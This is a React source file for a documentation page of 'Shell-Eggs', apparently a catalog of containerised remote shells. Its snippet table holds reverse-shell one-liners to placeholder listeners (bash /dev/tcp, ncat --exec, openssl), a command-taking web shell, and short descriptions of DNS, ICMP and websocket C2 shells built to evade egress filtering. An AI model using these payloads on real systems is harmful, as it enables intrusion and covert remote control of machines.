import { FadeIn } from "../components/magic";
import { DocsShell } from "../components/DocsShell";
import { type Family, REPO_TREE } from "../site";
import { SHELLS } from "../data/catalog";

const SNIPPETS: Record<string, string> = {
  ssh: "ssh -p <PORT> <user>@<host>",
  "ssh-cert": "ssh -i mykey -o CertificateFile=mykey-cert.pub -p <PORT> <user>@<host>",
  "ssh-hardened": "ssh -p <PORT> -i ~/.ssh/id_ed25519 <user>@<host>",
  dropbear: "ssh -p <PORT> <user>@<host>",
  telnetd: "telnet <host> <PORT>\nlogin: <user>   Password: <pass>",
  "mosh-server": "mosh --port=60000 <user>@<host>",
  tmux: "tmux attach -t shell-eggs",
  screen: "screen -r shell-eggs",
  zellij: "zellij attach shell-eggs",
  "ssh-local": "ssh -p <PORT> -N -L 8080:target.host:80 <user>@<host>",
  "ssh-remote": "ssh -p <PORT> -N -R 9090:internal.host:80 <user>@<host>",
  "ssh-dynamic": "ssh -p <PORT> -N -D 1080 <user>@<host>",
  "ssh-x11": "ssh -p <PORT> -X <user>@<host>",
  "rsync-ssh": "rsync -avz -e 'ssh -p <PORT>' ./folder/ <user>@<host>:~/dest/",
  sshfs: "sshfs -p <PORT> <user>@<host>:/home/container ./mnt",
  "bash-tcp": "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
  "bash-udp": "bash -i >& /dev/udp/LHOST/LPORT 0>&1",
  python: "socket + dup2 + subprocess, reconnect loop",
  "python-pty": "pty.spawn + socket + reconnect loop (full TTY)",
  php: "fsockopen + proc_open('/bin/bash -i')",
  "php-pentest": "full pentestmonkey-style PHP reverse shell",
  perl: "core Socket + exec /bin/sh -i",
  ruby: "TCPSocket + system()",
  lua: "io.popen loop over received lines",
  node: "net.connect + child_process.spawn",
  powershell: "System.Net.Sockets.TCPClient + Invoke-Expression",
  golang: "net.Dial source, compiled at boot",
  groovy: "Socket + ProcessBuilder (Jenkins-console style)",
  java: "Socket + ProcessBuilder, compiled at boot",
  awk: "gawk /inet/tcp co-process",
  nc: "FIFO relay - openbsd + traditional netcat",
  "nc-udp": "UDP flavor - listener must speak first",
  ncat: "ncat --exec /bin/sh LHOST LPORT",
  socat: "socat EXEC:...,pty,stderr,setsid,sigint,sane",
  cryptcat: "netcat + twofish (-k shared-key)",
  "openssl-rs": "openssl s_client -quiet -connect LHOST:LPORT",
  "socat-tls": "socat OPENSSL:... reverse, auto-generated client cert",
  "ncat-ssl": "ncat --ssl --exec /bin/sh LHOST LPORT",
  wssh: "Python websocket shell client (ws://) - passes as web traffic",
  dnscat: "DNS TXT-channel C2 client - for egress-restricted nets",
  "icmp-shell": "shell inside ICMP echo payloads (needs --cap-add NET_RAW)",
  "nc-bind": "nc <host> <PORT>",
  "socat-bind": "socat file:$(tty),raw,echo=0 TCP:<host>:<PORT>",
  "openssl-bind": "socat file:$(tty),raw,echo=0 OPENSSL:<host>:<PORT>,verify=0",
  "php-bind": "nc <host> <PORT>  (PHP socket_accept bind shell)",
  "python-bind": "nc <host> <PORT>  (Python socket bind + PTY)",
  ttyd: "browser → http://<host>:<PORT>  (xterm.js, basic-auth)",
  gotty: "browser → http://<host>:<PORT>  (Go static binary alternative)",
  "php-webshell": 'curl "http://<host>:<PORT>/?token=<TOKEN>&cmd=id"',
  "node-webshell": 'curl "http://<host>:<PORT>/?token=<TOKEN>&cmd=id"  (30s exec timeout)',
  "ssh-debug": "sshd -ddd on the server; ssh -p <PORT> -vvv <user>@<host>",
  "strace-shell": "login shell that traces every syscall to logs/",
  "tcpdump-shell": "session companion that captures .pcap for offline review",
  "socat-probe": "raw TCP relay + hex dump for protocol debugging",
};

export default function ShellFamilyPage({ family, route }: { family: Family; route: string }) {
  const shells = SHELLS.filter((s) => s.category === family.id);
  return (
    <DocsShell
      route={route}
      crumbs={[
        { label: "Docs", to: "/docs" },
        { label: "Shells", to: "/docs/shells" },
        { label: family.label },
      ]}
    >
      <FadeIn>
        <p className="eyebrow">Shell-Eggs Docs · {family.label}</p>
        <h1 className="grad-text mt-6 text-4xl font-extrabold tracking-tight">
          {family.icon} {family.label}
        </h1>
        <p className="mt-4 max-w-2xl" style={{ color: "var(--muted)" }}>
          {family.blurb}
        </p>
        <div className="glass mt-4 inline-block px-4 py-2 text-sm" style={{ color: "var(--text-2)" }}>
          <strong>Ports:</strong> {family.ports}
          {family.listener && (
            <>
              <br />
              <strong>Your listener:</strong>{" "}
              <code>{family.listener}</code>
              {family.listenNote && (
                <>
                  <br />
                  <span className="text-xs" style={{ color: "var(--faint)" }}>
                    {family.listenNote}
                  </span>
                </>
              )}
            </>
          )}
        </div>
      </FadeIn>

      <FadeIn delay={0.1}>
        <h2 className="doc-h2 mt-10">{shells.length} shells</h2>
        <table className="data-table">
          <thead>
            <tr>
              <th>ID</th>
              <th>Name</th>
              <th>Port</th>
              <th>Connect / payload</th>
            </tr>
          </thead>
          <tbody>
            {shells.map((s) => (
              <tr key={s.id}>
                <td className="whitespace-nowrap">
                  <code>{s.id}</code>
                  {s.needsRoot && (
                    <span className="ml-1 text-[10px]" style={{ color: "var(--faint)" }} title="prefers root in-container">
                      root
                    </span>
                  )}
                </td>
                <td className="text-[.85em]">{s.name}</td>
                <td className="whitespace-nowrap font-mono text-xs" style={{ color: "var(--faint)" }}>
                  {s.defaultPort === 0 ? "none" : s.defaultPort}
                </td>
                <td className="text-[.83em]" style={{ color: "var(--text-2)" }}>
                  {SNIPPETS[s.id] ?? s.description}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </FadeIn>

      <FadeIn delay={0.16}>
        <p className="mt-4 text-xs" style={{ color: "var(--faint)" }}>
          Every payload reconnects forever (2-5s backoff) and is auto-restarted by the supervisor. Full details in{" "}
          <a href={`${REPO_TREE}/SHELLs.md`} target="_blank" rel="noopener">
            SHELLs.md
          </a>
          .
        </p>
      </FadeIn>

    </DocsShell>
  );
}
